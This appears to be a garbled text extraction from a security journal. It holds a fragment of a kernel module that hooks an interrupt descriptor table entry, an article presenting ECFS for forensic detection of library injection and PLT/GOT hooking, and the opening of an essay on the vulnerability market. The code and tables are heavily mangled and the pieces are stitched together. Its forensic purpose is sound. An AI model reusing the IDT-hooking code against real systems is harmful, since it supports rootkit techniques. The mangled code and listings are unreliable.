gates [ i ] = gates [ i − 1] + 1;
90
p r i n t k ( " i n t %d entry addr %x , seg s e l %x , f l a g s %x , o f f s e t %x\n" , i n d e x , g a t e s [ i n d e x ] , (
u i n t 3 2 _ t ) g a t e s [ i n d e x ]−> s e g m e n t _ s e l e c t o r , ( u i n t 3 2 _ t ) g a t e s [ i n d e x ]−> f l a g s , GET_FULL_ISR( g a t e s [
i n d e x ]−> o f f s e t _ l o w , g a t e s [ i n d e x ]−> o f f s e t _ h i g h ) ) ;
92
94
96
f o r ( i = 0 ; i < 2 5 6 ; i ++)
o r i g i n a l _ h a n d l e r s [ i ] = GET_FULL_ISR( g a t e s [ i ]−> o f f s e t _ l o w ,
g a t e s [ i ]−> o f f s e t _ h i g h ) ;
g a t e s [ i n d e x ]−> o f f s e t _ l o w = GET_LOW_ISR(& f o o ) ;
g a t e s [ i n d e x ]−> o f f s e t _ h i g h = GET_HIGH_ISR(& f o o ) ;
98
return 0 ;
100 }
102 void cleanup_module ( void ) {
p r i n t k ( "cleanup entry %d\n" , i n d e x ) ;
104
g a t e s [ i n d e x ]−> o f f s e t _ l o w = GET_LOW_ISR( o r i g i n a l _ h a n d l e r s [ i n d e x ] ) ;
106
g a t e s [ i n d e x ]−> o f f s e t _ h i g h = GET_HIGH_ISR( o r i g i n a l _ h a n d l e r s [ i n d e x ] ) ;
}
488
Innovations with Linux core files for advanced process forensics
by Ryan O’Neill,
who also publishes as Elfmaster
8.1
Introduction
It has been some time since I’ve seen any really innovative steps forward in process memory forensics. It
remains a somewhat arcane topic, and is understood neither widely nor in great depth. In this article I will
try to remedy that, and will assume that the readers already have some background knowledge of Linux
process memory forensics and the ELF format.
Many of us have been frustrated by the near-uselessness of Linux (ELF) core files for forensics analysis.
Indeed, these files are only useful for debugging, and only if you also have the original executable that the
core file was dumped from during crash time. There are some exceptions such as /proc/kcore for kernel
forensics, but even /proc/kcore could use a face-lift. Here I present ECFS, a technology I have designed to
remedy these drawbacks.
8.2
Synopsis
ECFS (Extended core file snapshots) is a custom Linux core dump handler and snapshot utility. It can be
used to plug directly into the core dump handler by using the IPC functionality available by passing the
pipe ‘|’ symbol in the /proc/sys/kernel/core_pattern. ECFS can also be used to take an ecfs-snapshot of
a process without killing the process, as is often desirable in automated forensics analysis for whole-system
process scanning. In this paper, I showcase ECFS in a series of examples as a means of demonstrating its
capabilities. I hope to convince you how useful these capabilities will be in modern forensics analysis of
Linux process images—which should speak to all forms of binary and process-memory malware analysis. My
hope is that ECFS will help revolutionize automated detection of process memory anomalies.
ECFS creates files that are backward-compatible with regular core files but are also prolific in new
features, including section headers (which core files do not have) and many new section headers and section
header types. ECFS includes full symbol table reconstruction for both .dynsym and .symtab symbol tables.
Regular core files do not have section headers or symbol tables (and rely on having the original executable for
such things), whereas an ecfs-core contains everything a forensics analyst would ever want, in one package.
Since the object and readelf output of an ecfs-core file is huge, let us examine a simple ecfs-core for a
64-bit ELF program named host. The process for host will show some signs of virus memory infection or
backdooring, which ECFS will help bring to light.
The following command will set up the kernel core handler so that it pipes core files into the stdin of our
core–to–ecfs conversion program named ecfs.
# e c h o ’ | / opt/ e c f s /bin/ e c f s −i −e %e −p %p −o /opt/ e c f s / cores/%e .%p ’ > / proc / s y s / k e r n e l /
core_pattern
Next, let’s get the kernel to dump an ecfs file of the process for host, and then begin analyzing this file.
1 $ k i l l −11 ‘ p i d o f h o s t ‘
8.3
Section header reconstruction example
1 $ r e a d e l f −S / o p t / e c f s / c o r e s / h o s t . 1 0 7 1 0
49There are 40 section headers, starting at offset 0x23fff0:
1 S e c t i o n Headers :
[ Nr ] Name
3
Size
[ 0]
5
0000000000000000
[ 1] .interp
7
000000000000001 c
[ 2] .note
9
0 0 0 0 0 0 0 0 0 0 0 0 0 bd8
[ 3] .hash
11
000000000000001 c
[ 4 ] .dynsym
13
0 0 0 0 0 0 0 0 0 0 0 0 0 0 a8
[ 5] .dynstr
15
0000000000000050
[ 6] .rela.dyn
17
0000000000000018
[ 7] . r e l a . p l t
19
0000000000000090
[ 8] . i n i t
21
000000000000001 a
[ 9] .plt
23
0000000000000070
[10] .text
25
0000000000001000
[11] .fini
27
0000000000000009
[ 1 2 ] .eh_frame_hdr
29
0000000000000034
[ 1 3 ] .eh_f ra me
31
00000000000000 f 4
[ 1 4 ] .dynamic
33
0 0 0 0 0 0 0 0 0 0 0 0 0 1 d0
[15] .got.plt
35
0000000000000050
[ 1 6 ] .data
37
0000000000001000
[17] .bss
39
0000000000000008
[ 1 8 ] .heap
41
0000000000021000
[ 1 9 ] l d −2 . 1 9 . s o . t e x t
43
0000000000023000
[ 2 0 ] l d −2 . 1 9 . s o . r e l r o
45
0000000000001000
[ 2 1 ] l d −2 . 1 9 . s o . d a t a . 0
47
0000000000001000
[ 2 2 ] l i b c −2 . 1 9 . s o . t e x t
49
0 0 0 0 0 0 0 0 0 0 1 bb000
[ 2 3 ] l i b c −2 . 1 9 . s o . u n d e
51
0000000000200000
[ 2 4 ] l i b c −2 . 1 9 . s o . r e l r
53
0000000000004000
[ 2 5 ] l i b c −2 . 1 9 . s o . d a t a
55
0000000000002000
[26] evil_lib.so.text
57
0000000000002000
[27] .prstatus
59
0000000000000150
[28] .fdinfo
61
0000000000000 c78
[29] .siginfo
63
0000000000000080
[30] .auxvector
65
0000000000000130
[ 3 1 ] .exepath
67
0000000000000024
[32] .personality
69
0000000000000004
[33] .arglist
71
0000000000000050
[ 3 4 ] .stack
73
0000000000021000
[ 3 5 ] .vdso
75
0000000000002000
Type
EntSize
NULL
0000000000000000
PROGBITS
0000000000000000
NOTE
0000000000000000
GNU_HASH
0000000000000000
DYNSYM
0000000000000018
STRTAB
0000000000000018
RELA
0000000000000018
RELA
0000000000000018
PROGBITS
0000000000000000
PROGBITS
0000000000000010
PROGBITS
0000000000000000
PROGBITS
0000000000000000
PROGBITS
0000000000000000
PROGBITS
0000000000000000
DYNAMIC
0000000000000010
PROGBITS
0000000000000008
PROGBITS
0000000000000000
PROGBITS
0000000000000000
PROGBITS
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
SHLIB
0000000000000000
INJECTED
0000000000000000
PROGBITS
0000000000000150
PROGBITS
0000000000000214
PROGBITS
0000000000000080
PROGBITS
0000000000000008
PROGBITS
0000000000000008
PROGBITS
0000000000000004
PROGBITS
0000000000000001
PROGBITS
0000000000000000
PROGBITS
0000000000000000
Address
Flags
Link
Info
0000000000000000
0
0
0000000000400238
A
0
0
0000000000000000
A
0
0
0000000000400298
A
0
0
0 0 0 0 0 0 0 0 0 0 4 0 0 2 b8
A
5
0
0000000000400360
A
0
0
0 0 0 0 0 0 0 0 0 0 4 0 0 3 e0
A
4
0
00000000004003 f 8
A
4
0
0000000000400488
AX
0
0
0 0 0 0 0 0 0 0 0 0 4 0 0 4 b0
AX
0
0
0000000000400000
AX
0
0
0000000000400724
AX
0
0
0000000000400758
AX
0
0
000000000040078 c
AX
0
0
0000000000600 e28
WA
0
0
0000000000601000
WA
0
0
0000000000600000
WA
0
0
0000000000601058
WA
0
0
0 0 0 0 0 0 0 0 0 0 9 3 b000
WA
0
0
0000003000000000
A
0
0
0000003000222000
A
0
0
0000003000223000
A
0
0
0000003001000000
A
0
0
0 0 0 0 0 0 3 0 0 1 1 bb000
A
0
0
0 0 0 0 0 0 3 0 0 1 3 bb000
A
0
0
00000030013 bf000
A
0
0
00007 f b 0 3 5 8 c 3 0 0 0
A
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
00007 f f f 5 1 d 8 2 0 0 0
WA
0
0
00007 f f f 5 1 d f e 0 0 0
WA
0
0
50
Offset
Align
00000000
0
00002238
1
000004 a0
4
00002298
4
000022 b8
8
00002360
1
000023 e0
8
000023 f 8
8
00002488
8
000024 b0
16
00002000
16
00002724
16
00002758
4
00002790
8
00003 e 2 8
8
00004000
8
00003000
8
00004058
8
00005000
8
00026000
8
00049000
8
0004 a000
8
0004 c 0 0 0
8
00207000
8
00207000
8
0020 b000
8
00215000
8
0023 f 0 0 0
4
0023 f 1 5 0
4
0023 f d c 8
4
0023 f e 4 8
8
0023 f f 7 8
1
0023 f f 9 c
1
0023 f f a 0
1
00000000
8
0023 c 0 0 0
8[36]
77
79
81
83
.vsyscall
0000000000001000
[ 3 7 ] .symtab
0000000000000078
[38] .strtab
0000000000000037
[39] .shstrtab
0000000000000191
PROGBITS
ffffffffff600000
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 WA
0
0
SYMTAB
0000000000000000
0000000000000018
38
0
STRTAB
0000000000000000
0000000000000000
0
0
STRTAB
0000000000000000
0000000000000000
0
0
0023 e 0 0 0
8
00240 b81
4
00240 b f 9
1
002409 f 0
1
As you can see, there are even more section headers in our ecfs-core file than in the original executable
itself. This means that you can disassemble a complete process image with simple tools that rely on section
headers such as objdump! Also, please note this file is entirely usable as a regular core file; the only change
you must make to it is to mark it from ET_NONE to ET_CORE in the initial ELF file header. The reason it
is marked as ET_NONE is that objdump would know to utilize the section headers instead of the program
headers.
1 $ t o o l s / e t _ f l i p h o s t . 1 0 7 1 7 0 <− t h i s command f l i p s e_type from ET_NONE t o ET_CORE (And v i c e v e r s a )
$ gdb −q h o s t h o s t . 1 0 7 1 7 0
3 [ New LWP 1 0 7 1 0 ]
Core was g e n e r a t e d by ‘ e c f s _ t e s t s / h o s t ’ .
5 Program terminated with s i g n a l SIGSEGV, Segmentation f a u l t .
#0 0x00007fb0358c375a in ?? ( )
7 (gdb) bt
#0 0x00007fb0358c375a in ?? ( )
9 #1 0x00007fff51da1580 in ?? ( )
#2 0x00007fb0358c3790 in ?? ( )
11 #3 0x0000000000000000 in ?? ( )
For the remainder of this paper we will not be using traditional core file functionality. However, it is
important to know that it’s still available.
So what new sections do we see that have never existed in traditional ELF files? Well, we have sections
for important memory segments from the process that can be navigated by name with section headers. Much
easier than having to figure out which program header corresponds to which mapping!
1
3
5
7
[ 1 8 ] .heap
0000000000021000
[ 3 4 ] .stack
0000000000021000
[ 3 5 ] .vdso
0000000000002000
[36] .vsyscall
0000000000001000
PROGBITS
0 0 0 0 0 0 0 0 0 0 9 3 b000
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 WA
0
0
PROGBITS
00007 f f f 5 1 d 8 2 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 WA
0
0
PROGBITS
00007 f f f 5 1 d f e 0 0 0
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 WA
0
0
PROGBITS
ffffffffff600000
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 WA
0
0
00005000
8
00000000
8
0023 c 0 0 0
8
0023 e 0 0 0
8
Also notice that there are section headers for every mapping of each shared library. For instance, the
dynamic linker is mapped in as it usually is:
2
4
6
[ 1 9 ] l d −2 . 1 9 . s o . t e x t
0000000000023000
[ 2 0 ] l d −2 . 1 9 . s o . r e l r o
0000000000001000
[ 2 1 ] l d −2 . 1 9 . s o . d a t a . 0
0000000000001000
SHLIB
0000003000000000
00026000
0000000000000000
A
0
0
8
SHLIB
0000003000222000
00049000
0000000000000000
A
0
0
8
SHLIB
0000003000223000
0004 a000
0000000000000000
A
0
0
8
Also notice the section type is SHLIB. This was a reserved type specified in the ELF man pages that is
never used, so I thought this to be the perfect opportunity for it to see some action. Notice how each part
of the shared library is given its own section header: <lib>.text for the code segment, <lib>.relro for
the read-only page to help protect against .got.plt and .dtors overwrites, and <lib>.data for the data
segment.
51Another important thing to note is that in traditional core files only the first 4,096 bytes of the main
executable and each shared libraries’ text images are written to disk. This is done to save space, and,
considering that the text segment presumably should not change, this is usually OK. However, in forensics
analysis we must be open to the possibility of an RWX text segment that has been modified, e.g., with inline
function hooking.
8.4
Heuristics
Also notice that there is one section showing a suspicious-looking shared library that is not marked as the
type SHLIB but instead as INJECTED.
[26]
2
evil_lib.so.text
0000000000002000
INJECTED
0000000000000000
00007 f b 0 3 5 8 c 3 0 0 0
A
0
0
00215000
8
“#define SHT_INJECTED 0x200000” is custom and the readelf utility has been modified on my system
to reflect this. A standard readelf will show it as <unknown>.
This section is for a shared library that was considered by ecfs to be maliciously injected into the process.
The ecfs core handler does quite a bit of heuristics work on its own, and therefore leaves very little work for
the forensic analyst. In other words, the analyst no longer needs to know jack about ELF in order to detect
complex memory infections (more on this with the PLT/GOT hook detection later!)
Note that these heuristics are enabled by passing the -h switch to /opt/bin/ecfs. Currently, there
are occasional false-positives, and for people designing their own heuristics it might be useful to turn the
ecfs-heuristics off.
8.5
Custom section headers
Moving on, there are a number of other custom sections that bring to light a lot of information about the
process.
[27]
2
[28]
4
[29]
6
[30]
8
[31]
10
[32]
12
[33]
14
.prstatus
0000000000000150
.fdinfo
0000000000000 c78
.siginfo
0000000000000080
.auxvector
0000000000000130
.exepath
0000000000000024
.personality
0000000000000004
.arglist
0000000000000050
PROGBITS
0000000000000150
PROGBITS
0000000000000214
PROGBITS
0000000000000080
PROGBITS
0000000000000008
PROGBITS
0000000000000008
PROGBITS
0000000000000004
PROGBITS
0000000000000001
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0000000000000000
0
0
0023 f 0 0 0
4
0023 f 1 5 0
4
0023 f d c 8
4
0023 f e 4 8
8
0023 f f 7 8
1
0023 f f 9 c
1
0023 f f a 0
1
I will not go into complete detail for all of these, but will later show you a simple parser I wrote using the
libecfs API that is designed specifically to parse ecfs-core files. You can probably guess as to what most of
these contain, as they are somewhat straightforward; i.e., .auxvector contains the process’ auxiliary vector,
and .fdinfo contains data about the file descriptors, sockets, and pipes within the process, including TCP
and UDP network information. Finally, .prstatus contains elf_prstatus and similar structs.
8.6
Symbol table resolution
One of the most powerful features of ecfs is the ability to reconstruct full symbol tables for all functions.
$ r e a d e l f −s h o s t . 1 0 7 1 0
2
Symbol t a b l e
’ .dynsym ’ c o n t a i n s 7 e n t r i e s :
524
6
8
10
Num:
0:
1:
2:
3:
4:
5:
6:
Value
0000000000000000
000000300106 f 2 c 0
0 0 0 0 0 0 3 0 0 1 0 2 1 dd0
0 0 0 0 0 0 3 0 0 1 0 6 edb0
00007 f b 0 3 5 8 c 3 0 0 0
000000300106 f070
00000030010 c1890
Size
0
0
0
0
0
0
0
Type
NOTYPE
FUNC
FUNC
FUNC
NOTYPE
FUNC
FUNC
Bind
LOCAL
GLOBAL
GLOBAL
GLOBAL
WEAK
GLOBAL
GLOBAL Vis
DEFAULT
DEFAULT
DEFAULT
DEFAULT
DEFAULT
DEFAULT
DEFAULT Ndx
UND
UND
UND
UND
UND
UND
UND Name
t a b l e ’ .symtab ’ c o n t a i n s 5 e n t r i e s :
Value
Size Type
Bind
0 0 0 0 0 0 0 0 0 0 4 0 0 4 b0
112 FUNC
GLOBAL
0000000000400520
42 FUNC
GLOBAL
000000000040060d
160 FUNC
GLOBAL
0 0 0 0 0 0 0 0 0 0 4 0 0 6 b0
101 FUNC
GLOBAL
0000000000400720
2 FUNC
GLOBAL Vis
DEFAULT
DEFAULT
DEFAULT
DEFAULT
DEFAULT Ndx
10
10
10
10
10 Name
sub_4004b0
sub_400520
sub_40060d
sub_4006b0
sub_400720
fputs
__libc_start_main
fgets
__gmon_start__
fopen
sleep
12
Symbol
Num:
0:
16
1:
2:
18
3:
4:
14
Notice that the dynamic symbols (.dynsym) have values that actually reflect the location of where those
symbols should be at runtime. If you look at the .dynsym of the original executable, you would see those
values all zeroed out. With the .symtab symbol table, all of the original function locations and sizes
have been reconstructed by performing analysis of the exception handling frame descriptors found in the
PT_GNU_EH_FRAME segment of the program in memory. 37
8.7
Relocation entries and PLT/GOT hooks
Another very useful feature is the fact that ecfs-core files have complete relocation entries, which show the
actual runtime relocation values—or rather what you should expect this value to be. This is extremely handy
for detecting modification of the global offset table found in .got.plt section.
1 $ r e a d e l f −r h o s t . 1 0 7 1 0
3 R e l o c a t i o n s e c t i o n ’ .rela.dyn ’ at o f f s e t 0 x23e0 c o n t a i n s 1 e n t r i e s :
Offset
Info
Type
Sym. Value
Sym. Name + Addend
5 000000600 f f 8
0 0 0 4 0 0 0 0 0 0 0 6 R_X86_64_GLOB_DAT 00007 f b 0 3 5 8 c 3 0 0 0 __gmon_start__ + 0
7 Relocation s e c t i o n ’ . r e l a . p l t ’ at offset 0 x23f8 contains 6 e n t r i e s :
Offset
Info
Type
Sym. Value
Sym. Name + Addend
9 000000601018
0 0 0 1 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 6 f 2 c 0 f p u t s + 0
000000601020
0 0 0 2 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 2 1 dd0 __libc_start_main + 0
11 0 0 0 0 0 0 6 0 1 0 2 8
0 0 0 3 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 6 edb0 f g e t s + 0
000000601030
0 0 0 4 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 00007 f b 0 3 5 8 c 3 0 0 0 __gmon_start__ + 0
13 0 0 0 0 0 0 6 0 1 0 3 8
0 0 0 5 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 6 f 0 7 0 f o p e n + 0
000000601040
0 0 0 6 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 c 1 8 9 0 s l e e p + 0
Notice that the symbol values for the .rela.plt relocation entries actually show what the GOT should
be pointing to. For instance:
000000601028
0 0 0 3 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 6 edb0 f g e t s + 0
This means that 0x601028 should be pointing at 0x300106edb0, unless of course it hasn’t been resolved
yet, in which case it should point to the appropriate PLT entry. In other words, if 0x601028 has a value that
is not 0x300106edb0 and is not the corresponding PLT entry, then you have discovered malicious PLT/GOT
hooks in the process. The libecfs API comes with a function that makes this heuristic extremely trivial to
perform.
37 I
cover this nifty technique in more detail at http://www.bitlackeys.org/#eh_frame.
538.8
Libecfs Parsing and Detecting DLL Injection
Still sticking with our host.10710 ecfs-core file, let us take a look at the output of readecfs, a parsing
program I wrote. It’s a very small C program; its power comes from using libecfs.
1 $
−
3 −
−
5 −
. / readecfs . . / infected / host.10710
read_ecfs output f o r f i l e . . / i n f e c t e d / h o s t . 1 0 7 1 0
E x e c u t a b l e path ( . e x e p a t h ) : /home/ ryan / g i t / e c f s / e c f s _ t e s t s / h o s t
Thread c o u n t ( . p r s t a t u s ) : 1
Thread i n f o ( . p r s t a t u s )
[ t h r e a d 1 ] p i d : 10710
7
− E x i t e d on s i g n a l ( . s i g i n f o ) : 11
9 − f i l e s / pipes / sockets ( . f d i n f o ) :
[ f d : 0 ] path : / dev / p t s /8
11
[ f d : 1 ] path : / dev / p t s /8
[ f d : 2 ] path : / dev / p t s /8
13
[ f d : 3 ] path : / e t c / passwd
[ f d : 4 ] path : /tmp/ p a s s w d _ i n f o
15
[ f d : 5 ] path : /tmp/ e v i l _ l i b . s o
17 a s s i g n i n g
− P r i n t i n g s h a r e d l i b r a r y mappings :
19 l d −2 . 1 9 . s o . t e x t
l d −2 . 1 9 . s o . r e l r o
21 l d −2 . 1 9 . s o . d a t a . 0
l i b c −2 . 1 9 . s o . t e x t
23 l i b c −2 . 1 9 . s o . u n d e f
l i b c −2 . 1 9 . s o . r e l r o
25 l i b c −2 . 1 9 . s o . d a t a . 1
e v i l _ l i b . s o . t e x t // HMM INTERESTING
27
.dynsym : − 0
29 .dynsym : f p u t s − 300106 f 2 c 0
.dynsym : __libc_start_main − 3 00 1 02 1 dd0
31 .dynsym : f g e t s − 300106 edb0 // OF IMPORTANCE
.dynsym : __gmon_start__ − 7 f b 0 3 5 8 c 3 0 0 0
33 .dynsym : f o p e n − 300106 f 0 7 0
.dynsym : s l e e p − 30010 c 1 8 9 0
35
. s y m t a b : sub_4004b0 − 4004 b0
37 . s y m t a b : sub_400520 − 400520
. s y m t a b : sub_40060d − 40060 d
39 . s y m t a b : sub_4006b0 − 4006 b0
. s y m t a b : sub_400720 − 400720
41
− P r i n t i n g out GOT/PLT c h a r a c t e r i s t i c s ( p l t g o t _ i n f o _ t ) :
43 g o t s i t e : 601018 g o t v a l u e : 300106 f 2 c 0 g o t s h l i b : 300106 f 2 c 0 p l t v a l : 4004 c6
g o t s i t e : 601020 g o t v a l u e : 3 0 01 0 21 dd0 g o t s h l i b : 3 0 01 02 1 dd0 p l t v a l : 4004 d6
45 g o t s i t e : 601028 g o t v a l u e : 7 f b 0 3 5 8 c 3 7 6 7 g o t s h l i b : 300106 edb0 p l t v a l : 4004 e6 // WHAT I S WRONG HERE?
g o t s i t e : 601030 g o t v a l u e : 4004 f 6 g o t s h l i b : 7 f b 0 3 5 8 c 3 0 0 0 p l t v a l : 4004 f 6
47 g o t s i t e : 601038 g o t v a l u e : 300106 f 0 7 0 g o t s h l i b : 300106 f 0 7 0 p l t v a l : 400506
g o t s i t e : 601040 g o t v a l u e : 30010 c 1 8 9 0 g o t s h l i b : 30010 c 1 8 9 0 p l t v a l : 400516
49
− Printing auxiliary vector ( . a u x i l l i a r y ) :
51 AT_PAGESZ: 1000
AT_PHDR: 400040
53 AT_PHENT: 38
AT_PHNUM: 9
55 AT_BASE: 0
AT_FLAGS: 0
57 AT_ENTRY: 400520
AT_UID : 0
59 AT_EUID: 0
AT_GID: 0
61
− D i s p l a y i n g ELF h e a d e r :
63 e_entry : 0 x400520
e_phnum : 20
65 e_shnum : 40
e_shoff : 0 x 2 3 f f f 0
67 e _ p h o f f : 0 x40
e _ s h s t r n d x : 39
69
−−− t r u n c a t e d r e s t o f o u t p u t −−−
54Just from this output alone, you can see so much about the program that was running, including that
at some point a file named /tmp/evil_lib.so was opened, and—as we saw from the section header output
earlier—it was also mapped into the process.
[26]
2
evil_lib.so.text
0000000000002000
INJECTED
0000000000000000
00007 f b 0 3 5 8 c 3 0 0 0
A
0
0
00215000
8
Not just mapped in, but injected—as shown by the section header type SHT_INJECTED. Another red flag
can be seen by examining the line from my parser that I commented on with the note “WHAT IS WRONG
HERE?”
g o t s i t e : 601028 g o t v a l u e : 7 f b 0 3 5 8 c 3 7 6 7 g o t s h l i b : 300106 edb0 p l t v a l : 4004 e6
The gotvalue is 0x7fb0358c3767, yet it should be pointing to 0x300106edb0 or 0x4004e6. Notice
anything about the address that it’s pointing to? This address 0x7fb0358c3767 is within the range of
evil_lib.so. As mentioned before it should be pointing at 0x300106edb0, which corresponds to what
exactly? Well, let’s take a look.
1 $ r e a d e l f −r h o s t . 1 0 7 1 0 | g r e p 300106 edb0
000000601028
0 0 0 3 0 0 0 0 0 0 0 7 R_X86_64_JUMP_SLO 0 0 0 0 0 0 3 0 0 1 0 6 edb0 f g e t s + 0
So we now know that fgets() is being hijacked through a PLT/GOT hook! This type of infection has
been historically somewhat difficult to detect, so thank goodness that ECFS performed all of the hard work
for us.
To further demonstrate the power and ease-of-use that ECFS offers, let us write a very simple memory
virus/backdoor forensics scanner that can detect shared library (DLL) injection and PLT/GOT hooking.
Writing something like this without libecfs would typically take a few thousand lines of C code.
−− d e t e c t _ d l l _ i n f e c t i o n . c −−
2
#include " . . / l i b e c f s . h "
4
i n t main ( i n t a r g c , c h a r ∗∗ a r g v )
6 {
ecfs_elf_t ∗ desc ;
8
ecfs_sym_t ∗dsyms , ∗ l s y m s ;
c h a r ∗ progname ;
10
int i ;
char ∗ libname ;
12
ecfs_sym_t ∗ dsyms ;
unsigned long evil_addr ;
14
i f ( argc < 2) {
16
p r i n t f ( "Usage : %s <e c f s _ f i l e >\n" , a r g v [ 0 ] ) ;
exit (0) ;
18
}
20
desc = l o a d _ e c f s _ f i l e ( argv [ 1 ] ) ;
progname = get_exe_path ( d e s c ) ;
22
24
26
28
30
f o r ( i = 0 ; i < desc− >ehdr− >e_shnum ; i ++) {
i f ( d e s c − >s h d r [ i ] . s h _ t y p e == SHT_INJECTED) {
l i b n a m e = s t r d u p (& d e s c − >s h s t r t a b [ d e s c − >s h d r [ i ] .sh_name ] ) ;
p r i n t f ( " [ ! ] Found m a l i c i o u s l y i n j e c t e d shared l i b r a r y : %s \n" , l i b n a m e ) ;
}
}
pltgot_info_t ∗ pltgot ;
i n t r e t = g e t _ p l t g o t _ i n f o ( d e s c , &p l t g o t ) ;
55f o r ( i = 0 ; i < r e t ; i ++) {
i f ( p l t g o t [ i ] . g o t _ e n t r y _ v a != p l t g o t [ i ] . s h l _ e n t r y _ v a && p l t g o t [ i ] . g o t _ e n t r y _ v a !=
p l t g o t [ i ] .plt_entry_va )
p r i n t f ( " [ ! ] Found PLT/GOT hook , function ’name ’ i s pointing at %l x instead
o f %l x \n" ,
p l t g o t [ i ] .got_entry_va , e v i l _ a d d r = p l t g o t [ i ] . s h l _ e n t r y _ v a ) ;
}
r e t = get_dynamic_symbols ( d e s c , &dsyms ) ;
f o r ( i = 0 ; i < r e t ; i ++) {
i f ( dsyms [ i ] . s y m v a l == e v i l _ a d d r ) {
p r i n t f ( " [ ! ] %l x corresponds to hijacked function : %s \n" , dsyms [ i ] . s y m v a l , &dsyms [ i ] . s t r t a b [
dsyms [ i ] . n a m e o f f s e t ] ) ;
break ;
}
}
32
34
36
38
40
42
}
This program analyzes an ecfs-core file and detects both shared library injection and PLT/GOT hooking
used for function hijacking. Let’s now run it on our ecfs file.
1 $ . / detect_dll_infection host.10710
[ ! ] Found m a l i c o u s l y i n j e c t e d s h a r e d l i b r a r y : e v i l _ l i b . s o . t e x t
3 [ ! ] Found PLT/GOT hook , f u n c t i o n ’name ’ i s p o i n t i n g a t 7 f b 0 3 5 8 c 3 7 6 7 i n s t e a d o f 300106 edb0
[ ! ] 300106 edb0 c o r r e s p o n d s t o h i j a c k e d f u n c t i o n : f g e t s
With just simple forty lines of C code, we have an advanced detection tool capable of detecting an
advanced memory infection technique, commonly used by attackers to backdoor a system with a rootkit or
virus.
8.9
In Closing
If you liked this paper and are interested in using or contributing to ECFS, feel free to contact me. It will
be made available to the public in the near future. 38
Shouts to Orangetoaster, Baron, Mothra, Dk, Sirus, and Per for ideas, support and feedback regarding
this project.
38 http://github.com/elfmaster/ecfs
56579
Bambaata speaks from the past.
by Count Bambaata, Senior NASCAR Correspondent
“Myths and legends die hard in America. We love them for the extra dimension they provide, the illusion of
near–infinite possibility to erase the narrow confines of most men’s reality. Weird heroes and mould–breaking
champions exist as living proof to those who need it that the tyranny of ’the rat race’ is not yet final.”
Gonzo Papers, Vol. 1: The Great Shark Hunt: Strange Tales from a Strange Time, Hunter S. Thompson,
1979.
It’s been an interesting ride for someone who has
witnessed nearly all of the perspectives and colliding
philosophies of the computer security practice. Hav-
ing met professionals and enthusiasts of other fields
of knowledge built upon the foundations of scientific
work, I could say few other industries are as swarmed
with swine and snake oil salesmen as computer secu-
rity. I guess the medium lends itself to such delusions
of self–worth and importance. Behind a screen, where
you can’t see the white of the eyes of the people you
interact with, anything is possible.
It doesn’t help it that, deprived of other values as
important as human contact, true friendship and un-
interested genuine camaraderie, fame and financial
success dictate the worth of the individual. Far from
being the essence of the so–called American dream,
where the individual succeeds thanks to persistence
and true innovation, in computer security, and more
specifically, in the area of security I will be address-
ing in this letter, success comes from becoming a vir-
tual merchant of vacuum and nothingness, charging
a commission for doing absolutely nothing, bringing
absolutely no innovation, unfortunately at tax pay-
ers expense, as we will see later. An economy built
upon the mistakes of others, staying afloat only so as
long as such mistakes are never addressed and true
solutions remain undeveloped and underutilized.
Going back to the early 2000s, there were two ma-
jor perspectives on publication and distribution of
security vulnerabilities. On one side, those against
it (not for economical reasons but a philosophy tak-
ing from the times when “hacking” actually meant to
hack, not for publicity or profit, but curiosity and
technical prowess). These “black hats” perhaps rep-
resented the last remnants of a waning trend of de-
testing the widely extended practice of capitalizing
security vulnerabilities in a perpetual state of fear
and confusion taking advantage of the (then mostly)
ignorant user base of networked computers. Oppos-
ing them, a large mob in the industry proclaimed
the benefits and legitimacy of “full” and “responsible”
58
disclosure. These individuals claimed the right moral
choice was to make information about exploitation
of vulnerabilities (and the flaws themselves) publicly
available.
They were eager to call out “black hats” with dis-
dain, as dangerous amoral people whose intentions
ranged from everything between stealing banking cre-
dentials, spreading viruses or, well, fucking children
if they ran out of expletives and serious sounding ac-
cusations for the press. No accusation was too far-
fetched. Underneath, an entire network of consulting
firms thrived on the culture of fear carefully built with
hype. Techniques and vulnerabilities known to the
anti–disclosure community for years surfaced, leading
to events such as the swift sweep of format string vul-
nerabilities that led to a bug class nearly phasing out
of existence within less than two years. Back then,
some of the members of the industry were able to
market IDS products to customers keeping a straight
face. And the swine only got better at that game.
As much as groups such as Anonymous and others
have prostituted whatever was left of that original
“antisecurity” community and its philosophy, whose
purpose had nothing to do with achieving fame out
of proclaiming themselves as some sort of armchair
bourgeoisie revolutionaries, today the landscape is, if
you pardon the expression, hilarious. Fast forward
to a post–9/11 America, with the equities problem
(COMSEC versus SIGINT) leaning to the side of
SIGINT. The consulting houses from the old days and
a swarm of new small shops appeared in the radar to
supply a niche necessity created as an attempt to ad-
dress the systematic compromise and ravaging of de-
fense industry corporations and federal government
networks.
Welcome to the vulnerability market. Flock after
flock of vultures fly in circles in a market where obscu-
rity, secrecy and true loyalty are no longer desirable
traits, but handicaps. If you are discreet, and remain
silent and isolated from the other “players”, the buy-
ers will play you out. In a strange mix of publicityhogs and uncleared greed–crazed freaks, middlemen
thrive as the intelligence community desperately tries
